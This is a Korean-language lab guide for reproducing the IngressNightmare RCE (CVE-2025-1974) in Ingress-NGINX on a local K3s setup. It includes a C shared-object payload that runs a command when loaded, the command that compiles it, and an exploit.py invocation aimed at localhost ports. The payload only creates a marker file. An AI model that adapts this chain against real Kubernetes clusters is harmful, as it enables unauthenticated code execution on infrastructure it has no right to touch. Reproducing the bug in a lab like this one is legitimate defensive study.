# Kubernets Ingress-NGINX 인증되지 않은 원격 코드 실행(CVE-2025-1974)

Ingress-NGINX: NGINX를 역방향 프록시 및 로드 밸런서로 사용하는 Kubernetes 용 인그레스 컨트롤러

"IngressNightmare" 취약점(CVE-2025-1974)은 수신되는 Ingree 리소스의 유효성을 검사하는 쿠버네티스의 핵심 보안 메커니즘인 Ingress-NGINX Admission Controller 의 치명적인 결함에서 비롯된다.

이 컨트롤러는 인증 없이도 네트워크에 노출되어 공격자가 악성 AdmissionReview 요청을 조작하고 Ingress 리소스에 무단 구성을 삽입할 수 있도록 한다.

다른 취약점(CVE-2025-24514, CVE-2024-1097 또는 CVE-2025-1098)과 연계될 경우 원격 코드 실행으로 이어질 수 있다.

일부 악용 가능한 체인은 다음과 같다.

CVE-2025-1974+CVE-2025-24514: <kbd>auth-url</kbd> 주석 주입을 통한 RCE

CVE-2025-1974+CVE-2025-1097: <kbd>auth-tls-match-cn</kbd> 주석을 통한 RCE

CVE-2025-1974+CVE-2025-1098: 이미지 UID 남용을 통한 RCE

## 환경 설정
취약점을 시뮬레이션 하기 위해 단순성을 위해 K3s 기반 Kubernetes 환경이 사용된다

```
docker compose up -d
```

쿠버네티스 API가 준비되고 Ingress-nginx 컨트롤러가 시작될 때까지 기다린다.
환경이 시작되면, Ingress-NGINX는 30080번과 30443번 포트(TLS)에서 수신 대기하고, Ingress-NGINX Admission Controller는 30443번 포트이다.

## 취약성 재생산
<kbd>.so</kbd> 먼저, 컨테이너의 아키텍처와 일치하는 공유 객체( ) 페이로드를 컴파일해야 한다.
```
#include<stdio.h>
#include<stdlib.h>

__attribute__((constructor)) static void reverse_shell(void)
{
    system("touch /tmp/hacked");
}
```

1. 소스 코드 컴파일

```
gcc -shared -fPIC -o shell.so shell.c
```

2. 위의 소스 코드를 적절한 환경으로 컴파일한 후 exploit.py를 사용하여 취약점을 악용

```
python exploit.py -a https://localhost:30443/networking/v1/ingresses -i http://localhost:30080/fake/addr -s shell.so
```
<kbd>AdmissionReview</kbd> exploit은 NGINX가 악성 동적 공유 객체를 로드하도록 강제하는 지시어 주입 요청을 위조하여 작동한다.

exploit이 성공하면 ingress-nginx 컨테이너 내부에 파일이 <kbd>ssl_engine</kbd> 생성되는 것을 확인할 수 있다.








